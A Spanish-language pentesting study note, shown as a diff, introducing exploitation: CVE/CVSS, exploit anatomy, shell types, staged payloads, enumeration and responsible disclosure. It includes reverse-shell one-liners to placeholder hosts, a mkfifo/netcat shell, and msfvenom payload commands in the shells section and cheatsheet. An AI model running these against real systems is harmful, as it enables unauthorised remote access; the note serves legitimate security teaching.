@@ -6,95 +6,254 @@ aliases:
   - Burp Suite
   - Enumeración de Sistemas Linux
 tags:
-  - hacking/explotacion
+  - sec/exploit
   - herramientas/burpsuite
   - linux/seguridad
-  - scripting/bash
   - redes/conceptos
-estado: 🟢 Terminado
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Reconocimiento y Escaneo de Redes y Web]]"
+  - "[[Enumeración de Servicios y CMS]]"
+  - "[[Python Ofensivo]]"
+  - "[[Msfvenom - Herramienta de Generación de Payloads]]"
+  - "[[Elevación de Privilegios mediante Explotación de Binarios]]"
+fuente: "https://nvd.nist.gov/vuln-metrics/cvss"
 ---
+
 # Introducción a la Explotación de Vulnerabilidades
 
-Una vez completada la fase de reconocimiento inicial, podemos proceder con la fase de explotación. Sin embargo, es crucial comprender algunos conceptos fundamentales antes de iniciar la explotación de vulnerabilidades.
+Tras el reconocimiento (ver [[Reconocimiento y Escaneo de Redes y Web]]) llega la fase de **explotación**: convertir una vulnerabilidad identificada en un resultado tangible (una shell, un archivo leído, una ejecución de código). Esta nota fija el marco —ciclo de vida, anatomía de un exploit, lenguaje CVE/CVSS, tipos de shells y payloads— sobre el que se apoyan todas las técnicas posteriores.
 
-A lo largo de las siguientes secciones, exploraremos diferentes tipos de shells (como las reverse shells, bind shells y forward shells), las cuales nos permitirán establecer conexiones de red y tomar control de un sistema comprometido. Hablaremos sobre los diferentes tipos de payloads (staged y non-staged) y cómo se utilizan para ejecutar código malicioso en el sistema objetivo.
+> [!warning] Seguridad y legalidad primero
+> Toda explotación **sin autorización escrita es ilegal** (CNI/LOIH en España, CFAA en EE. UU.). Reglas de oro del laboratorio:
+> - Aislamiento: VMs de víctima y atacante en red **host-only/interna**, sin salida a Internet si es posible.
+> - Alcance (*scope*) explícito y límites acordados (especialmente en bug bounties: ver §8).
+> - Sin DoS, sin borrado de datos, sin modificar servicios más allá de lo necesario para la prueba.
+> - Cada acción queda registrada con timestamp para el informe (ver [[Creación de Informes en LaTeX]]).
+>
+> Los comandos de esta nota son **documentación de referencia**: se leen, se entienden y se practican en laboratorios propios (HTB, VulnHub, DVWA), nunca contra sistemas ajenos.
 
-Además, se discutirá la diferencia entre las explotaciones manuales y automatizadas, presentando herramientas que pueden ser utilizadas para automatizar el proceso de explotación de vulnerabilidades.
+## 1. Ciclo de vida de una vulnerabilidad
 
-Por último, se introducirá la herramienta **Burp Suite**, una suite de herramientas para realizar pruebas de penetración y análisis de vulnerabilidades en aplicaciones web.
+```
+Descubrimiento → Confirmación (PoC) → Explotación → Payload → Post-explotación → Reporte
+     │                 │                    │            │              │
+  hallazgo         reproduce el        convierte el    lo que se       escalada,
+  (fuzzing,        bug sin daño        fallo en        envía/executa    lateral,
+  código, CVE)     (crash mínimo)      control         (shell, data)    informe
+```
 
-> [!info] Burp Suite: La navaja suiza del pentesting web
-> Burp Suite es una plataforma integrada para realizar pruebas de seguridad en aplicaciones web. Ofrece herramientas para mapear, analizar, encontrar y explotar vulnerabilidades. Es esencial para interceptar, modificar y reenviar tráfico HTTP/S, lo que permite un control granular sobre las interacciones con la aplicación objetivo.
+| Etapa | Qué se hace | Resultado | Ejemplo |
+|---|---|---|---|
+| **Descubrimiento** | Fuzzing, revisión de código, OSINT de CVEs, escaneo de versiones | Sospecha fundamentada | `nmap -sV` → Apache 2.4.49 |
+| **PoC** (*proof of concept*) | Reproducir el fallo con mínima magnitud | Confirma que es real, no te da control | Petición que provoca 500 / crash |
+| **Explotación** | Convertir el fallo en ejecución o fuga de datos | Acceso: shell, fichero, bypass | Payload que salta a `system()` |
+| **Payload** | Código que se ejecuta en el objetivo | Reverse shell, meterpreter, stager | `bash -i >& /dev/tcp/…` |
+| **Post-explotación** | Consolidar: enumerar, escalar, moverte lateralmente | Objetivo cumplido | LSE, sudo, SUID (ver escalada) |
+| **Reporte** | Evidencia, impacto, remediación | Hallazgo cerrado | [[Creación de Informes en LaTeX]] |
 
-## Reverse Shell, Bind Shell y Forward Shells
+### Descubrimiento: de dónde salen los exploits
 
-En esta sección, veremos las diferencias entre Reverse Shell, Bind Shell y Forward Shell:
+| Fuente | Mecánica | Dónde |
+|---|---|---|
+| **CVE** | Identificador público de vulnerabilidad conocida | <https://cve.mitre.org/> · NVD |
+| **Exploit-DB / searchsploit** | Exploits públicos listos (coincidencia de versión) | `searchsploit apache 2.4.49` |
+| **Fuzzing** | Entradas malformadas buscando crashes | AFL, wfuzz, BOF |
+| **Revisión de código** | Taint analysis: entrada → sink sin sanitizar | Semgrep, code review |
+| **CVAs/CWEs** | Clasificación del *tipo* de bug (CWE-79 = XSS) | <https://cwe.mitre.org/> |
 
-- **Reverse Shell**: Es una técnica que permite a un atacante establecer una conexión desde la máquina comprometida (víctima) hacia la máquina del atacante (servidor de escucha). Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que inicia la conexión de vuelta, permitiendo al atacante tomar el control.
+## 2. CVE y CVSS: el lenguaje del triaje
 
-> [!tip] Ventaja de la Reverse Shell
-> Las Reverse Shells son particularmente útiles en escenarios donde la máquina objetivo se encuentra detrás de un firewall o NAT que bloquea las conexiones entrantes directas. Al iniciar la conexión desde la víctima, se aprovechan las reglas de salida que suelen ser más permisivas.
+- **CVE** = identificador único y público (`CVE-2014-0160`). Sirve para *comunicar* sin describir el exploit.
+- **CWE** = clase de debilidad (`CWE-119` buffer errors) — agrupa muchos CVEs.
+- **CVSS** = puntuación 0,0–10,0 que prioriza; el vector explica la nota:
 
-- **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   → 9,8 (crítico)
+```
 
-> [!warning] Consideraciones de la Bind Shell
-> Las Bind Shells requieren que la máquina objetivo tenga un puerto abierto y accesible desde la red del atacante. Esto a menudo implica que el firewall de la víctima debe permitir conexiones entrantes a ese puerto, lo que las hace menos efectivas contra sistemas bien protegidos por firewalls perimetrales.
+| Componente | Valores | Pregunta |
+|---|---|---|
+| **AV** (Attack Vector) | `N` red, `L` local, `A` adyacente, `F` físico | ¿Desde dónde se puede explotar? |
+| **AC** (Complexity) | `L` baja, `Al` alta | ¿Requiere condiciones especiales? |
+| **PR** (Privileges) | `N` ninguna, `L` bajas, `H` altas | ¿Qué acceso previo hace falta? |
+| **UI** (User Interaction) | `N` ninguna, `S` requerida | ¿Necesita que alguien haga click? |
+| **S** (Scope) | `U` sin cambio, `C` con cambio | ¿Afecta a otro componente? |
+| **C/I/A** | `H/M/L` | Confidencialidad / Integridad / Disponibilidad |
 
-- **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
+| Rango CVSS | Severidad | Acción típica |
+|---|---|---|
+| 0,0–3,9 | Baja | Backlog |
+| 4,0–6,9 | Media | Parche en ciclo normal |
+| 7,0–8,9 | Alta | Parche prioritario |
+| 9,0–10,0 | **Crítico** | Parche inmediato / explotación trivial |
 
-> [!info] Mecanismo de la Forward Shell con `mkfifo`
-> `mkfifo` crea un "named pipe" o FIFO (First-In, First-Out) en el sistema de archivos. A diferencia de los pipes anónimos, los named pipes persisten en el sistema de archivos y pueden ser abiertos por múltiples procesos. En una Forward Shell, un proceso escribe en el FIFO y otro lee de él, simulando una comunicación interactiva bidireccional a través de un archivo, eludiendo restricciones de red directas.
+> [!tip] CVSS ≠ riesgo real
+> Un CVSS 9,8 con el puerto solo accesible desde una VLAN interna no es "urgente" para el negocio; un 7,5 expuesto a Internet sí lo es. Usa CVSS como base y **añade contexto**: exposición, valor del activo, existencia de exploit público (KEV de CISA).
 
-Es importante entender las diferencias entre estas técnicas para poder determinar cuál es la mejor opción en función del escenario de ataque y las limitaciones de la red.
+## 3. Anatomía de un exploit (memoria corrupta)
 
-## Tipos de Payloads (Staged y Non-Staged)
+La mayoría de exploits binarios nacen de errores de memoria; entenderlos explica qué hace "dentro" un exploit automatizado:
 
-- **Payload Staged**: Es un tipo de payload que se **divide en dos o más etapas**. La primera etapa es una pequeña porción de código (conocida como *stager*) que se envía al objetivo. Su propósito principal es establecer una conexión de red fiable y segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
+| Tipo de bug | Mecánica | Resultado para el atacante |
+|---|---|---|
+| **Buffer overflow (stack)** | Escritura más allá de un buffer local → se pisa el puntero de retorno | Control de EIP/RIP → ejecución arbitraria |
+| **Format string** (`printf(user)`) | `%n` escribe en direcciones de la pila | Lectura/escritura arbitraria |
+| **Integer overflow** | `len + cabecera` desborda y alloca poco → heap overflow | Corrupción de estructuras adyacentes |
+| **Use-after-free** | Objeto liberado y reutilizado | Tipo confusion → vtable hijack |
+| **Deserialización** | Datos no confiables reconstruyen objetos con métodos peligrosos | RCE (ver [[Abuso de APIs]] y notas de deserialización) |
 
-> [!tip] Eficiencia y Evasión con Payloads Staged
-> Los payloads Staged son más eficientes en términos de tamaño inicial, lo que reduce la probabilidad de detección por sistemas de seguridad basados en firmas. Además, permiten al atacante adaptar la carga útil final (segunda etapa) en función de la información recopilada durante la primera etapa, ofreciendo mayor flexibilidad y evasión.
+### Del crash al shell: las capas de un exploit
 
-- **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
+1. **Localizar el offset**: cyclic pattern → saber en qué byte cae el RIP (`pattern_create`/`pattern_offset` de Metasploit, `pwn cyclic`).
+2. **Controlar el flujo**: sobreescribir el retorno con la dirección de una `gadget` o de `shellcode`.
+3. **Bypass de defensas**: cada mitigación obliga a una técnica:
 
-> [!warning] Riesgos de Detección con Payloads Non-Staged
-> Aunque más simples de implementar, los payloads Non-Staged envían toda la carga útil maliciosa de una sola vez. Esto los hace más susceptibles a ser detectados por sistemas de detección de intrusiones (IDS/IPS) o antivirus que analizan el tamaño y el contenido completo del payload.
+| Mitigación | Qué impone | Técnica ofensiva típica |
+|---|---|---|
+| **NX/DEP** (no ejecución en stack) | El stack no es ejecutable | **ROP**: encadenar gadgets existentes (`ret2libc`, `system("/bin/sh")`) |
+| **ASLR** (aleatorización de direcciones) | Direcciones desconocidas | Leak de puntero (format string, error HTTP) o fuzz de 4 bits en 32 bits |
+| **PIE** (binario relocable) | El propio binario se desplaza | Leak del base address + desplazamientos relativos |
+| **Stack canary** | Checksum entre buffer y retorno | Leer la canary (leak) antes de desbordar |
+| **RELRO completo** | GOT en solo-lectura | No se puede reescribir la GOT → buscar otra vía |
 
-Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.
+> [!info] Shellcode, stager y ROP en una frase cada uno
+> - **Shellcode**: código máquina en bruto (p. ej. `execve("/bin/sh")`) que se inyecta y se redirige el flujo hacia él.
+> - **Stager**: trozo mínimo que abre un canal y descarga el payload grande (§5).
+> - **ROP**: sin poder ejecutar código propio, encadenas fragmentos ya presentes en el binario (`gadget`s terminados en `ret`) hasta montar el efecto deseado.
+>
+> En CTF, estos pasos los automatiza Metasploit o `pwntools`; entenderlos permite adaptar el exploit cuando el binario varía (ver [[Elevación de Privilegios mediante Explotación de Binarios]]).
 
-## Tipos de Explotación (Manuales y Automatizadas)
+## 4. Shells: reverse, bind y forward
 
-- **Explotación Manual**: Es un tipo de explotación que se realiza de **manera manual** y requiere que el atacante tenga un conocimiento profundo del sistema y sus vulnerabilidades. En este enfoque, el atacante emplea herramientas y técnicas específicas para identificar, analizar y explotar vulnerabilidades en un sistema objetivo, a menudo requiriendo un entendimiento profundo de la lógica de la aplicación o del sistema operativo. Este enfoque es más lento y requiere más esfuerzo y habilidad por parte del atacante, pero también es más preciso y permite un mayor control sobre el proceso de explotación.
+| Tipo | Quién conecta a quién | Requiere | Uso típico |
+|---|---|---|---|
+| **Reverse shell** | Víctima → atacante (escucha) | Puerto de salida abierto en la víctima | El 90% de los casos; evita firewalls de entrada |
+| **Bind shell** | Atacante → víctima (puerto abierto) | Puerto accesible *hacia* la víctima | Solo sin firewall/DMZ abierta |
+| **Forward shell** | Canal intermedio existente (HTTP/webshell) + FIFO local | Acceso previo por otro canal | Firewalls estrictos, sin conexión directa |
 
-> [!info] Precisión y Discreción de la Explotación Manual
-> La explotación manual permite una mayor precisión y un menor "ruido" en la red, lo que reduce las posibilidades de detección. Es ideal para vulnerabilidades complejas o cuando se busca un acceso sigiloso y persistente, ya que el atacante puede adaptar cada paso del proceso.
+- **Reverse shell**: la víctima inicia la conexión; se aprovechan las reglas de salida, normalmente más permisivas. Ejemplo clásico: `bash -i >& /dev/tcp/ATT/PRT 0>&1` (catálogo completo en [[Python Ofensivo]]).
+- **Bind shell**: la víctima escucha en un puerto; el atacante se conecta. **Warning**: exige que el firewall permita entradas, por eso cae en desuso frente a reverse.
+- **Forward shell con `mkfifo`**: se crea un *named pipe* en la víctima; un proceso escribe y otro lee, simulando una consola bidireccional sobre un canal ya existente (p. ej. HTTP tunneling) sin abrir nuevos puertos.
 
-- **Explotación Automatizada**: Es un tipo de explotación que se realiza **automáticamente** mediante el uso de **herramientas automatizadas**, como scripts o programas diseñados específicamente para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más rápido y menos laborioso que el enfoque manual, pero también puede ser menos preciso y puede generar más ruido en la red objetivo, lo que aumenta el riesgo de detección.
+```bash
+# Mecanismo de la forward shell (patrón mkfifo en la víctima)
+mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATT 80 > /tmp/f; rm /tmp/f
+```
 
-> [!tip] Velocidad y Escalabilidad de la Explotación Automatizada
-> La explotación automatizada es invaluable para escanear y explotar rápidamente un gran número de sistemas o para identificar vulnerabilidades conocidas en entornos amplios. Herramientas como Metasploit Framework o Nessus son ejemplos clave que facilitan este tipo de explotación.
+> [!info] Por qué un FIFO
+> `mkfifo` crea un archivo especial con política FIFO en el filesystem: sobrevive a los procesos y admite apertura concurrente. El shell escribe su stdout en la tubería y el lector remoto devuelve comandos por la misma vía — comunicación bidireccional sin conexión TCP propia.
 
-Es importante tener en cuenta que el tipo de explotación utilizado en un ataque dependerá de los objetivos del atacante, sus habilidades y del nivel de seguridad implementado en el sistema objetivo. En general, los ataques de explotación manual son más precisos y discretos, pero también requieren más tiempo y habilidades. Por otro lado, los ataques de explotación automatizada son más rápidos y menos laboriosos, pero también pueden ser más ruidosos y menos precisos.
+## 5. Payloads: staged vs non-staged
 
-## Enumeración del Sistema
+| | **Staged** | **Non-staged** |
+|---|---|---|
+| Qué se envía | 1ª etapa mínima (**stager**) que descarga el resto | Payload completo de una vez |
+| Tamaño inicial | Kilobytes | Cientos de KB |
+| Ventaja | Evasión (poco que inspeccionar al principio) y adaptación del 2º estadio | Simple, sin segundo canal |
+| Riesgo | El stager también se detecta; el download puede ser bloqueado | Más fácil de capturar por IDS/AV por tamaño y firmas |
+| Ejemplo msfvenom | `payload/windows/shell_reverse_tcp` | `payload/windows/shell_reverse_tcp` **sin** `-stageless`… en Meterpreter: `.../meterpreter/reverse_tcp` vs `.../meterpreter_reverse_tcp` |
 
-Algunas de las herramientas que vemos en esta sección son:
+```bash
+# Generación de payloads — referencia completa en [[Msfvenom - Herramienta de Generación de Payloads]]
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe
+```
 
-- **LSE** (**Linux Smart Enumeration**): Es una herramienta de enumeración para sistemas Linux que permite a los atacantes obtener información detallada sobre la configuración del sistema, los servicios en ejecución, los permisos de archivo y posibles vectores de escalada de privilegios. LSE utiliza una variedad de comandos de Linux para recopilar información y presentarla en un formato fácil de entender. Al utilizar LSE, los atacantes pueden detectar posibles vulnerabilidades y encontrar información valiosa para futuros ataques.
+> [!warning] Detección
+> Los payloads non-staged envían todo el código de una vez: IDS/AV basados en firmas y tamaño los capturan más fácil. Los staged son más pequeños pero añaden tráfico de descarga que también se correlaciona. La respuesta defensora en ambos casos: detección de comportamiento (spawn de shell desde proceso de red), no solo firmas.
 
-> [!info] Capacidades de LSE
-> LSE automatiza la recolección de información crítica para la escalada de privilegios en Linux. Examina configuraciones de red, archivos de configuración sensibles, permisos de SUID/SGID, tareas cron, servicios en ejecución y más, presentando los resultados de manera organizada para facilitar el análisis del atacante.
+## 6. Explotación manual vs automatizada
 
-- **Pspy**: Es una herramienta de enumeración de procesos que permite a los atacantes observar los procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares de tiempo. Pspy es una herramienta útil para la detección de malware y backdoors, así como para la identificación de procesos maliciosos que se ejecutan en segundo plano sin la interacción del usuario.
+| | **Manual** | **Automatizada** |
+|---|---|---|
+| Cómo | Ajuste fino con la consola: payloads, offsets, offsets de versión | Metasploit, Nessus, scripts |
+| Velocidad | Lenta | Rápida, escalable a muchos hosts |
+| Precisión | Alta; control total del alcance | Más falsos positivos, ajuste limitado |
+| "Ruido" en red | Bajo | Alto (muchas peticiones, firmas conocidas) |
+| Ideal para | Vulnerabilidades complejas, entornos frágiles, acceso sigiloso | Barridos amplios, vulnerabilidades conocidas con exploit público |
 
-> [!tip] Uso de Pspy para la Detección de Actividad
-> Pspy es extremadamente útil para observar procesos que se ejecutan periódicamente (como tareas cron) o procesos que se inician y terminan rápidamente, los cuales podrían pasar desapercibidos con herramientas de monitoreo estáticas. Permite identificar patrones de actividad y posibles backdoors o scripts ocultos.
+> [!tip] Flujo recomendado
+> Automatiza el **descubrimiento** (`searchsploit`, escaneo), manualiza la **explotación** cuando el automatizado falla o hace demasiado ruido. Metasploit como andamio, no como caja negra: si no entiendes qué hace el módulo, no sabrás qué escribir en el informe ni por qué falla.
 
-Asimismo, desarrollaremos un script en Bash ideal para detectar tareas y comandos que se ejecutan en el sistema a intervalos regulares de tiempo, abusando para ello del comando ‘**ps -eo user,command**‘ que nos chivará todo lo que necesitamos.
+## 7. Post-explotación inicial: enumeración
 
-> [!info] `ps -eo user,command`: Un comando fundamental
-> El comando `ps -eo user,command` es una herramienta poderosa para listar todos los procesos en ejecución (`-e`) y mostrar el usuario propietario (`user`) junto con el comando completo que inició el proceso (`command`). Esto es crucial para identificar procesos sospechosos, servicios no autorizados o scripts que se ejecutan con privilegios elevados.
+Algunas herramientas clave para consolidar el acceso (detalle en escalada de privilegios):
 
-A continuación, se proporciona el enlace a estas herramientas:
+| Herramienta | Qué aporta | Enlace |
+|---|---|---|
+| **LSE** (*Linux Smart Enumeration*) | Jerarquiza hallazgos: SUID, cron, permisos, red, contenedores | <https://github.com/diego-treitos/linux-smart-enumeration> |
+| **Pspy** | Vigila procesos en tiempo real **sin root** (inclusos los efímeros de cron) | <https://github.com/DominicBreuker/pspy> |
+| **`ps -eo user,command`** | Lista todos los procesos con su usuario y línea de comandos — base de cualquier vigilancia manual | — |
 
-- **Herramienta LSE**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-- **Herramienta PSPY**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+```bash
+# Vigilancia de actividad periódica con ps (bucle sencillo)
+while true; do ps -eo user,command --sort=start_time | tail -20; sleep 2; done
+# Con Pspy (binario estático en la víctima):
+./pspy64     # muestra UIDs, PIDs y comandos de cron/systemd en vivo
+```
+
+> [!info] Por qué Pspy
+> Las tareas cron cortas aparecen y desaparecen entre dos `ps` consecutivos; Pspy lee `/proc` y los eventos `inotify`/`fanotify` continuamente, así que captura también los procesos que duran milisegundos — el clásico vector de escalada por cron mal configurado.
+
+## 8. Divulgación responsable y alcance
+
+| Paso | Contenido |
+|---|---|
+| 1. Verificar | PoC reproducible, sin DoS, en tus laboratorios o con autorización |
+| 2. Notificar | Canal privado del proveedor (SECURITY.md, bug bounty, CERT/CSIRT) |
+| 3. Plazo | Coordinación típica: 90 días públicos, 30–60 privados según política |
+| 4. Resolución | El vendor parchea, se asigna CVE, se publica advisory |
+| 5. Publicación | Solo con permiso; sin exploit detallado antes del parche |
+
+En bug bounties (HackerOne, Bugcrowd): el **scope** define qué activos, dominios y tipos de vulnerabilidad son elegibles; salirse del scope anula la recompensa y puede acarrear consecuencias legales. Ignorar `robots.txt` o probar en producción sin autorización expresa = fuera de programa.
+
+## 9. Errores comunes del operador
+
+1. **Explotar sin enumerar**: el payload adecuado depende de arquitectura (`x86` vs `x64`), SO y versión — `file`, `uname -a`, `nmap -sV` antes.
+2. **Elegir non-staged cuando no cabe** (o staged cuando no hay salida a Internet): el stager necesita conectarse de vuelta.
+3. **Confiar en el exploit de searchsploit sin leerlo**: muchas versiones difieren en offsets; adaptar siempre.
+4. **Olvidar el listener**: `nc -lvnp 443` tiene que estar antes de disparar el payload.
+5. **No verificar estabilidad**: un exploit que crash-ea la mitad de las veces arruina la prueba y alerta al defensor.
+6. **Mezclar laboratorio y producción** sin alcance escrito — el error más caro de todos.
+
+## 10. Cheatsheet
+
+```bash
+# Identificar
+nmap -p- --open -sS -sV -sC <IP> -oN all          # versión + scripts
+searchsploit <producto> <versión>                  # exploits públicos
+curl -s <URL> | head -30                           # servidor/tecnología
+
+# Preparar
+msfvenom -p <payload> LHOST=<tu_ip> LPORT=<puerto> -f <formato> -o out
+nc -lvnp <puerto>                                  # listener ANTES de disparar
+
+# Shells de emergencia (laboratorio autorizado)
+bash -i >& /dev/tcp/IP/PORT 0>&1                   # reverse bash
+mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc IP 80 > /tmp/f   # forward
+
+# Post-explotación
+./lse.sh -l 1 ; ./pspy64 ; sudo -l ; find / -perm -4000 2>/dev/null
+```
+
+## 11. Referencias
+
+- NVD / CVSS: <https://nvd.nist.gov/vuln-metrics/cvss>
+- CVE: <https://cve.mitre.org/> · CWE: <https://cwe.mitre.org/>
+- Exploit Database: <https://www.exploit-db.com/> · GTFOBins: <https://gtfobins.github.io/>
+- HackTricks (post-explotación): <https://book.hacktricks.wiki/>
+- MITRE ATT&CK (técnicas): <https://attack.mitre.org/>
+- CISA KEV (exploits en explotación activa): <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
+
+## Relacionadas
+
+- [[Reconocimiento y Escaneo de Redes y Web]] — la fase previa
+- [[Enumeración de Servicios y CMS]] — de versión a vulnerability mapping
+- [[Python Ofensivo]] — catálogo de reverse shells y herramientas propias
+- [[Msfvenom - Herramienta de Generación de Payloads]] — generar payloads
+- [[Elevación de Privilegios mediante Explotación de Binarios]] — del crash al root
+- [[Creación de Informes en LaTeX]] — documentar el hallazgo
